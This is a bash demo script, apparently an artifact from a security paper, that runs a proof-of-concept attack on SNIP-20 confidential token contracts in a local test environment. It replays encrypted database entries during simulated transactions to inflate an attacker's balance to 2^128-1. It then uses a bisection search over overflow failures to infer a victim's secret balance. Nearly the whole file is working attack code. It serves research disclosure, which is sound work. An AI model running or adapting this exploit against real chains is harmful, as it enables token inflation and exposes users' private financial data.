#!/bin/bash

set -e

source ./scripts/demo_utils.sh
source ./scripts/local_test_params.sh

attacker1=${ACC0}
attacker2=${ACC1}
victim=${ACC2}

a1_vk=`cat ${BACKUP}/attacker1_viewing_key`
a2_vk=`cat ${BACKUP}/attacker2_viewing_key`
victim_vk=`cat ${BACKUP}/victim_viewing_key`

get_balance() {
    addr=$1
    vk=$2
    balance=`secretd query snip20 balance ${CONTRACT_ADDRESS} ${addr} ${vk}`
    echo ${balance} | jq .balance.amount
}


show_attacker_balance() {
    addr=$1
    vk=$2
    label=$3
    balance=`get_balance ${addr} ${vk}`
    teebox log "attacker balance\[${label}]=${balance}"
}

show_attacker2_balance() {
    balance_addr2=`get_balance ${attacker2} ${a2_vk}`
    teebox log "attacker balance\[addr2]=${balance_addr2}"
}

show_attacker_balances() {
    balance_addr1=`get_balance ${attacker1} ${a1_vk}`
    balance_addr2=`get_balance ${attacker2} ${a2_vk}`
    teebox log "attacker balance\[addr1]=${balance_addr1}"
    teebox log "attacker balance\[addr2]=${balance_addr2}"
}

echo
teebox info-panel "Artifact for Section 5.5" --title "Querying SNIP-20 account balances"

echo
teebox info-panel $'[bold]Victimo :innocent:[/]: User whose secret balance is being spied on\n[bold]Atako :rage:[/]: Attacker who can modify the untrusted code base and simulate transactions and controls two addresses' --title "Cast of Characters"

echo
teebox log "Victim (Victimo :innocent:) address=${victim}, balance=12343"
teebox log "Attacker (Atako :rage:) first address=${attacker1}, balance=10000"
teebox log "Attacker (Atako :rage:) second address=${attacker2}, balance=10000"

CONTRACT_ADDRESS=$(cat $BACKUP/contractAddress.txt)
CODE_HASH=$(cat $BACKUP/codeHash.txt)

snapshot_uniq_label=$(date '+%Y-%m-%d-%H:%M:%S')

teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to set snapshot ${snapshot_uniq_label}-start ..."

teebox log "Fork()    [light_goldenrod1]# set snapshot of database ${snapshot_uniq_label}-start[/]"
set_snapshot "${snapshot_uniq_label}-start"

show_attacker_balances
# victim is the victim
rm -f $BACKUP/victim_key
rm -f $BACKUP/adv_key
rm -f $BACKUP/adv_value
rm -f $BACKUP/kv_store
touch $BACKUP/victim_key
touch $BACKUP/adv_key
touch $BACKUP/adv_value
touch $BACKUP/kv_store

# get boosting key and value
teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to get attacker's addr1 balance database key and value ..."
#teebox log "Get boosting key and value"

teebox log "[bold]Simulate(Transfer(attacker_addr2, attacker_addr1, 1))[/]"
generate_and_sign_transfer ${attacker2} ${attacker1} 1 snip20_getkey
simulate_tx snip20_getkey
show_attacker_balances

#res=$(cat $BACKUP/simulate_result)
#teebox log "result of simulate_tx snip20_getkey ${res}"
tag=$(sed '5q;d' $BACKUP/kv_store)
key=${tag:6:-1}
tag=$(sed '6q;d' $BACKUP/kv_store)
value=${tag:8:-1}
teebox log "attacker addr1 balance encrypted db key=${key}"
teebox log "attacker addr1 balance encrypted db value=${value}"

#teebox log "boost balance of attacker2"
# FIXME boost balance of attacker2 --> attacker 1 -- it's attacker's addr1 db key/value
echo $key > $BACKUP/backup_adv_key
echo $value > $BACKUP/backup_adv_value

teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to set snapshot ${snapshot_uniq_label}-boost ..."
teebox log "Fork()    [light_goldenrod1]# set snapshot of database[/] ${snapshot_uniq_label}-boost"
set_snapshot "${snapshot_uniq_label}-boost"
amount=10000

show_attacker_balances

teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start Balance Inflation Attack ..."
for i in {1..114}; do
    echo
    teebox log "starting iteration=${i} ..."
    show_attacker_balances

    # now balance[addr1]=0
    # replay the balance[addr1] back to B
    #teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to restore ..."
    teebox log "Replay(balance\[addr1]=B)    [light_goldenrod1]# reset attacker's account "
    cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
    cp -f $BACKUP/backup_adv_value $BACKUP/adv_value

    #teebox log "After restoring attacker's balance[addr1]"
    show_attacker_balances

    #teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to simulate tx ..."
    teebox log "[bold]Simulate(Transfer(addr2, addr1, amount=${amount}))[/]"
    generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_boost_1
    simulate_tx snip20_boost_1
    #teebox log "After Simulate()"
    #show_attacker_balances

    #teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] before wiping out kv store and attacker's balance ..."
    #teebox log "(Wipe out key-value store and attacker addr1)"
    rm -f $BACKUP/adv_key
    rm -f $BACKUP/adv_value
    rm -f $BACKUP/kv_store
    touch $BACKUP/adv_key
    touch $BACKUP/adv_value
    touch $BACKUP/kv_store

    #teebox log "After Replay()"
    show_attacker_balances

    #teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to simulate tx ..."

    # amt := B if 2B ≤ (2^128 − 1) else (2^128 − 1) − B
    amount=$(bc <<< "${amount} * 2")

    teebox log "[bold]Simulate(Transfer(addr1, addr2, amount=${amount}))[/]"
    generate_and_sign_transfer ${attacker1} ${attacker2} ${amount} snip20_boost_2
    simulate_tx snip20_boost_2

    #teebox log "After Simulate()"
    show_attacker_balances

    # attacker addr1 (sender above) encrypted amount sent
    tag=$(sed '4q;d' $BACKUP/kv_store)
    value=${tag:8:-1} 
    echo $value > $BACKUP/backup_adv_value

    teebox log "ending iteration=${i}"
    #show_attacker_balances
done

cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
amount=$(bc <<< "2^128 - 1 - ${amount}")
generate_and_sign_transfer ${attacker1} ${attacker2} $amount snip20_boost_1
simulate_tx snip20_boost_1

# probe victim balance
rm -f $BACKUP/kv_store
touch $BACKUP/kv_store
amount=$(bc <<< "2^128 - 1")
generate_and_sign_transfer ${attacker2} ${attacker1} $amount snip20_getkey
simulate_tx snip20_getkey

tag=$(sed '3q;d' $BACKUP/kv_store)
key=${tag:6:-1}
tag=$(sed '4q;d' $BACKUP/kv_store)
value=${tag:8:-1}
echo $key > $BACKUP/backup_adv_key
echo $value > $BACKUP/backup_adv_value

low=0
high=$(bc <<< "2^128 - 1")
cnt=0

echo
teebox info-panel "Through a bisection search, we simulate transactions that transfer a probe amount [bold yellow]P[/] from the attacker's account to the victim's account. A transaction succeeds if the victim's balance [bold yellow]B[/] < 2^128 - [bold yellow]P[/], and fails otherwise." --title "Probing Victim's Balance"

teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start probing victim's balance ..."

while [[ "$(bc <<< "${high} - ${low}")" -ne 0 ]]; do
    probe=$(bc <<< "(${high} + ${low} + 1) / 2" )
    echo
    teebox log "iteration=${cnt}"
    teebox log "low=${low}"
    teebox log "high=${high}"
    teebox log "probe=${probe}"

    echo
    teebox log "Fork()    [light_goldenrod1]# set snapshot of database[/]"
    teebox log "Replay(balance\[attacker]=2^128-1)    [light_goldenrod1]# reset attacker's balance to inflated amount"
    cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
    cp -f $BACKUP/backup_adv_value $BACKUP/adv_value
    set_snapshot "${snapshot_uniq_label}-${cnt}"
    
    teebox log "[bold]Simulate(Transfer(attacker, victim, probe=${probe}))[/]"
    generate_and_sign_transfer ${attacker2} ${victim} ${probe} snip20_adv
    simulate_tx snip20_adv
    simulate_tx_result=$(cat $BACKUP/simulate_result)

    echo
    # Assumes exit code 0, meaning successful, and exit code 1, meaning failure (overflow)
    if [ ${simulate_tx_result} != 0 ]; then
        high=$(bc <<< "${probe} - 1");
        teebox log "Transaction simulation [red]failed[/], [bold yellow]probe[/] is too high ([bold yellow]probe[/] + [bold yellow]B[/] >= 2^128)"
        teebox log "Decrease next [bold yellow]probe[/] amount by setting [bold]high[/]=([bold][yellow]probe[/]-1)=${high}[/]"
        balance_floor=$(bc <<< "2^128 -1 - ${probe}")
        teebox log "Balance [bold yellow]B[/] > ${balance_floor}"
    else
        low=${probe};
        teebox log "Transaction simulation [green]succeeded[/], [bold yellow]probe[/] is low enough ([bold yellow]probe[/] + [bold yellow]B[/] < 2^128)"
        teebox log "Increase next [bold yellow]probe[/] amount by setting [bold]low[/]=([bold][yellow]probe[/])=${probe}[/]"
        balance_ceiling=$(bc <<< "2^128 - ${probe}")
        teebox log "Balance [bold yellow]B[/] < ${balance_ceiling}"
    fi

    cnt=$((cnt + 1))
    echo
done

balance=$(bc <<< "2^128 - 1 - ${low}")
teebox log "Victim's :innocent: inferred balance=${balance}"
